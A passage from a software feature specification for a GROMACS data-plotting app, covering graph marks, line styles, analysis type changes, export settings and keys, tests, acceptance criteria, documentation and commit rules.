   - A mark stores its curve and x, never its y; the y always comes from the data. If the data changes, the mark is flagged.
3. **Reference lines.** Ctrl+click (⌘+click on macOS) adds a **vertical** dashed line at that x; Ctrl+Shift+click (⌘+Shift+click) adds a **horizontal** one at that y. They are styled like the zero line and labelled with their value.
4. **Managing them.** A small list under the graph shows every mark and line, editable by keyboard, removable (arm and confirm), and stored with the graph.
   - Phase 0 proposes where (per cell and tab), as part of the one on-disk plan.
   - They are shown in Compare and in exports.
5. Clicks must not clash with existing interactions (run chips, the drag of analysis chips, laser, compare).

### Tests

- **Snapping:** the nearest point, the nearest curve, gaps, hidden curves ignored.
- **Coordinates:** pixel ↔ data on linear axes.
- **Marks survive** reopening and appear in exports.
- **A flagged mark** after a curve is replaced.

### Manual checks

- Hover on `temperature.xvg`.
- Marks on `phosphorus.xvg`'s two peaks.
- Reference lines on a PMF.
- macOS key labels.
- Keyboard only.
- Screenshots.

---

## 11. R6: Line style per curve

### Today (verified)

- Dash patterns come from the run index (`DASH` in `ctx.ts`).
- Curve records store visibility and shade only (`curveDisplay`).

### Requirements

- A control next to each curve (and each PMF run) chooses its dash from `DASH` only, or "automatic" (today's rule).
- It is stored with the curve or run, and used by the screen, Compare and exports.
- Colour never becomes the only difference between curves (Morpheus rule).

### Tests

- The choice round-trips through the vault and the export format.
- Automatic equals today's dashes.

---

## 12. R7: Change an analysis's type

### Today (verified)

- An analysis's type can't be changed after upload (`moveExtra` only moves it between run slots).
- PMF runs and analyses are separate entities. A file wrongly filed as a PMF can't become an analysis.

### Requirements

1. **Change type** on an analysis: pick any type.
   - The original file stays where it is (or is moved within the vault by the normal journaled path); nothing is re-uploaded.
   - The analysis's folder name follows the new type.
2. **PMF run ↔ analysis.** A PMF run can become an analysis of any type, and an analysis with one curve can become a PMF run, in the same slot. Ask whether to include this (recommended: yes; it is the fix for files filed as PMF by mistake today).
3. **Clashes.** If the target type already exists in that slot, the dialog offers the same choices as uploads (replace or add as curves), and says exactly what goes to the trash.
4. **A preview of every consequence before saving:** matrix values that appear or disappear, curves re-read with the new type's columns (ask whether to re-read or keep the current curves), and marks that no longer apply.

### Tests

- Re-typing within analyses.
- Run → analysis and back.
- Clashes.
- The preview lists exactly what the save does (one pure function, as R5 of batch 1 did for merges).
- Originals are byte-identical; journaled; trash and restore.

---

## 13. R8: Exports

### Today (verified)

- Graphs and the matrix export as `xvg`, `png` or `pdf` from a menu (`ExportFormat`). An SVG writer exists inside `export.ts`, but isn't offered.
- There are no export settings, no batch export, and no export key.
- The compare key (C) shows how a held key picks cells.

### Requirements

1. **Settings → Export:**
   - default format (`pdf`, `png`, `svg`, `xvg`; ask about `svg`);
   - size (px, or mm for journal columns) and PNG scale;
   - theme (light, dark, print/black-and-white);
   - font size;
   - title block on or off;
   - legend content and position;
   - grid;
   - file-name template;
   - the layout for several graphs (one file each, a multi-page PDF, or one grid figure);
   - the destination (downloads, or a folder I choose once, remembered like the vault handle, never inside the vault).
2. **E in the graph dialog** exports that graph **exactly as shown** (tab, transform, visibility, shades, dashes, smoothing, marks, reference lines, axis choice) in the default format, with a toast naming the file.
3. **Hold E in the matrix,** click cells (as with the compare key), and release to export every picked graph with its view settings. **Hold Shift+E** to export every analysis of the picked cells together with the PMF. Ask:
   - what releasing E with no picks does (recommendation: nothing, with a hint);
   - which view settings a cell has when it isn't open (recommendation: its stored settings and today's graph settings).
4. **A default legend** in each export shows the marked values and/or the cell's value for the current matrix metric (value ± spread, unit, function, transform), as set in Export settings.
5. **Exports match the screen** (section 1.3), including the colour scale and units for matrix exports.
6. The key is configurable like the others, and never fires while typing.

### Tests

- **Export layout (pure):** sizes, mm → px, page breaks, grid placement, legend contents.
- **Naming:** the template, and collisions.
- **The scene of an exported graph** equals the on-screen graph's scene, marks and lines included.
- **Batch:** the selection gives the expected list of graphs, for E and Shift+E.
- **Keys:** not while typing; the hold-and-pick behaviour.

### Manual checks

- E on an open graph.
- Hold E, three cells, release.
- Shift+E.
- Every format and layout.
- The legend with marks and the matrix value.
- Screenshots.

---

## 14. Testing (all requests)

- **Vitest, in Node.** Every decision is a pure function, tested table-driven.
- **Real files only.**
  - Use the example files (section 3), the existing fixtures and real GROMACS output.
  - Pyodide runs in Node, so script tests use the real runtime; the sandbox tests run in a browser worker (R3).
  - Never invent a file format. Ask for a sample.
- **Golden tests** before any change that could move a number: the parser on existing fixtures, Area and Min, wells, markers and today's exports.
- **On-disk change:** frozen schema-3 and v6 fixtures; upgrade; an interrupted upgrade; a newer vault read-only; export round trip; older exports still import.
- **Safety tests** for scripts (section 1.4), in a browser worker.
- **No UI test framework** without my approval. Manual checks with screenshots, recorded as passed, failed or not run.
- Report the test count before and after.

---

## 15. Acceptance criteria

- **A. Any data.**
  - Every example file loads, is recognised (or explicitly generic) with its source shown, and is drawn as section 3 says, with labels as agreed.
  - macOS metadata files are never offered as data.
  - No unknown file becomes a PMF.
  - Existing fixtures parse as before.
- **B. Correction.** The PMF correction is a visible setting (entropy correction, none, or a transform). Defaults leave every existing number identical. The translocation profile is uncorrected.
- **C. Scripts.**
  - `functions.py` uploads, its functions (with parameters) appear next to the built-ins, and they give section 3's reference values, errors included.
  - Scripts run sandboxed (both layers of section 1.4, tested in a browser), trusted per content in this browser, with timeouts and provenance.
- **D. Matrix.** Any type, curve, function and transform can fill the matrix, with units, spread, a fitting colour scale and provenance. Area and Min are unchanged.
- **E. Graphs.** Hover values, marks and Ctrl/⌘ reference lines work by mouse and keyboard, survive reopening, and appear in exports.
- **F. Style and type.** Line style per curve. Type changes (including PMF ↔ analysis) with an exact preview.
- **G. Exports.**
  - Export settings, E, hold-E and Shift+E work.
  - Exports match the screen and carry the legend of marks and matrix values.
- **H. Vault intact.** Originals byte-identical; one agreed schema step, with every older vault and export still opening.
- **I. Quality.**
  - Lint, build and tests pass, with no warnings beyond the baseline.
  - No console errors.
  - New UI is keyboard-usable and announced.
  - Net lines are reported per item.

---

## 16. Documentation

Update `README.md`:
- **Supported formats** and how types are recognised.
- **The correction setting.**
- **Writing scripts:** the two signatures, parameters, units, allowed modules, the missing-value rule, errors, the sandbox and trust; a worked example from `functions.py`.
- **Matrix metrics and colour scales.**
- **Marks, reference lines and line styles.**
- **Exports and their keys.**
- **The vault format:** the new schema and export versions, `_scripts/`, and what is stored where.

---

## 17. Commits

- One commit per roadmap item, with its ID first (`R1a: parser reads @ xlabel, nan and plain x y`). Plus one commit each for the Phase 0 docs, the example files (if I agree), the frozen fixtures and the final report.
- Every commit passes lint, build and tests on its own.
- Stage files by name. Never commit generated files (`dist/`, `.vault-out/`), Pyodide's files unless agreed, or scratch files.
- Don't amend, rebase or force-push, and don't push unless I ask.

---

## 18. Final report: `docs/feature-batch-3-report.md`

1. **Summary table:** item → status → files → lines added / removed → tests added → decisions.
2. **Per request:** what changed and why, behaviour before and after, known limitations.
3. **The example files, end to end:** section 3's table completed with what the app now does, and each tile value next to its reference value.
4. **Screenshots** (small PNGs in `docs/img/batch-3/`), light and dark: everything listed in Phase 0 step 5, as built.
5. **On-disk changes:** the schema and export versions, the migration step, and one example each of a script record, a matrix metric, a mark, a reference line, a line style and a type change, before and after.
6. **Tests:** count before and after, the new tests, and the manual QA checklist with passed, failed or not run for each item.
7. **Review:** what the fresh-context review found, and what was done about each finding.
8. **Decisions** F81… (link to `docs/feature-decisions.md`).
9. **Roadmap status** and the updated backlog.
10. **History:** `git log --oneline` for the batch, and `git diff --stat` from the baseline commit.
